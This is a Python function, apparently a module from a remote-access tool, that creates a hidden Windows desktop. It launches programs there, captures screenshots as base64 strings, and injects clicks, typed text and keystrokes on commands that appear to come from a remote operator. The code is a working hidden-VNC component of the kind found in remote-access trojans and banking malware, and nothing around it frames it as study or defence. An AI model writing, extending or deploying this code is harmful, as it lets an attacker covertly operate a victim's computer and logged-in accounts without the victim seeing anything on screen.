def hidden_desktop(command):
    import sys
    if sys.platform != 'win32':
        return 'hidden desktop requires windows'
    import ctypes
    from ctypes import wintypes
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    k32 = ctypes.windll.kernel32
    rest = str(command)[5:].strip()
    action, _, arg = rest.partition(' ')
    action = action.strip()
    arg = arg.strip()
    name = getattr(hidden_desktop, '_name', None)
    if not name:
        import os
        name = 'd' + os.urandom(4).hex()
        hidden_desktop._name = name

    def ensure():
        desk = getattr(hidden_desktop, '_desk', None)
        if desk:
            return desk
        desk = u32.CreateDesktopW(name, None, None, 0, 0x10000000, None)
        if not desk:
            desk = u32.OpenDesktopW(name, 0, False, 0x10000000)
        hidden_desktop._desk = desk
        return desk

    def on_desktop(fn):
        desk = ensure()
        if not desk:
            return 'desktop open failed'
        if not u32.SetThreadDesktop(desk):
            return 'set desktop failed'
        return fn()

    if action in ('', 'start'):
        exe = arg or r'C:\Windows\explorer.exe'
        def spawn():
            class SI(ctypes.Structure):
                _fields_ = [('cb', wintypes.DWORD), ('reserved', wintypes.LPWSTR), ('desktop', wintypes.LPWSTR),
                            ('title', wintypes.LPWSTR), ('x', wintypes.DWORD), ('y', wintypes.DWORD),
                            ('xSize', wintypes.DWORD), ('ySize', wintypes.DWORD), ('xCountChars', wintypes.DWORD),
                            ('yCountChars', wintypes.DWORD), ('fillAttribute', wintypes.DWORD), ('flags', wintypes.DWORD),
                            ('showWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD), ('lpReserved2', ctypes.c_void_p),
                            ('stdInput', wintypes.HANDLE), ('stdOutput', wintypes.HANDLE), ('stdError', wintypes.HANDLE)]
            class PI(ctypes.Structure):
                _fields_ = [('hProcess', wintypes.HANDLE), ('hThread', wintypes.HANDLE), ('pid', wintypes.DWORD), ('tid', wintypes.DWORD)]
            si = SI()
            si.cb = ctypes.sizeof(si)
            si.desktop = 'WinSta0\\' + name
            si.flags = 1
            si.showWindow = 5
            pi = PI()
            cmd = ctypes.create_unicode_buffer(exe)
            if not k32.CreateProcessW(None, cmd, None, None, False, 0x10, None, None, ctypes.byref(si), ctypes.byref(pi)):
                return 'spawn failed'
            k32.CloseHandle(pi.hProcess)
            k32.CloseHandle(pi.hThread)
            return 'desktop started pid=%d' % pi.pid
        return on_desktop(spawn)
    if action == 'frame':
        def frame():
            hdc = u32.GetDC(0)
            sw, sh = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
            if sw <= 0 or sh <= 0:
                sw, sh = 1024, 768
            dw = 320 if sw > 320 else sw
            dh = max(1, sh * dw // sw)
            mem = g32.CreateCompatibleDC(hdc)
            bmp = g32.CreateCompatibleBitmap(hdc, dw, dh)
            old = g32.SelectObject(mem, bmp)
            g32.StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, 0x00CC0020)
            g32.SelectObject(mem, old)
            class BI(ctypes.Structure):
                _fields_ = [('size', wintypes.DWORD), ('width', wintypes.LONG), ('height', wintypes.LONG),
                            ('planes', wintypes.WORD), ('bitCount', wintypes.WORD), ('compression', wintypes.DWORD),
                            ('sizeImage', wintypes.DWORD), ('xppm', wintypes.LONG), ('yppm', wintypes.LONG),
                            ('clrUsed', wintypes.DWORD), ('clrImportant', wintypes.DWORD)]
            bi = BI(40, dw, dh, 1, 24, 0, 0, 0, 0, 0, 0)
            stride = ((dw * 3 + 3) // 4) * 4
            pixels = ctypes.create_string_buffer(stride * dh)
            g32.GetDIBits(mem, bmp, 0, dh, pixels, ctypes.byref(bi), 0)
            g32.DeleteObject(bmp)
            g32.DeleteDC(mem)
            u32.ReleaseDC(0, hdc)
            import base64, struct
            blob = pixels.raw
            data = b'BM' + struct.pack('<IHHI', 54 + len(blob), 0, 0, 54) + struct.pack('<IiiHHIIiiII', 40, dw, dh, 1, 24, 0, len(blob), 0, 0, 0, 0) + blob
            return 'HDIMG:%d,%d:' % (sw, sh) + base64.b64encode(data).decode()
        return on_desktop(frame)
    if action in ('click', 'rclick'):
        parts = arg.split()
        if len(parts) < 2:
            return 'click needs x y'
        x, y = int(parts[0]), int(parts[1])
        def click():
            sw, sh = u32.GetSystemMetrics(0) or 1024, u32.GetSystemMetrics(1) or 768
            u32.mouse_event(0x8001, int(x * 65535 / sw), int(y * 65535 / sh), 0, 0)
            if action == 'rclick':
                u32.mouse_event(0x0008, 0, 0, 0, 0)
                u32.mouse_event(0x0010, 0, 0, 0, 0)
                return 'rclick %d %d' % (x, y)
            u32.mouse_event(0x0002, 0, 0, 0, 0)
            u32.mouse_event(0x0004, 0, 0, 0, 0)
            return 'click %d %d' % (x, y)
        return on_desktop(click)
    if action == 'type':
        if not arg:
            return 'type needs text'
        def typed():
            for ch in arg:
                if ch in '\r\n':
                    u32.keybd_event(13, 0, 0, 0)
                    u32.keybd_event(13, 0, 2, 0)
                    continue
                pair = u32.VkKeyScanW(ord(ch))
                vk = pair & 0xFF
                if vk == 0xFF:
                    continue
                if pair & 0x100:
                    u32.keybd_event(0x10, 0, 0, 0)
                u32.keybd_event(vk, 0, 0, 0)
                u32.keybd_event(vk, 0, 2, 0)
                if pair & 0x100:
                    u32.keybd_event(0x10, 0, 2, 0)
            return 'typed %d' % len(arg)
        return on_desktop(typed)
    if action == 'key':
        vk = int(arg or '13')
        def key():
            u32.keybd_event(vk, 0, 0, 0)
            u32.keybd_event(vk, 0, 2, 0)
            return 'key %d' % vk
        return on_desktop(key)
    if action == 'stop':
        desk = getattr(hidden_desktop, '_desk', None)
        if desk:
            u32.CloseDesktop(desk)
            hidden_desktop._desk = None
        return 'desktop stopped'
    return 'unknown desktop action'
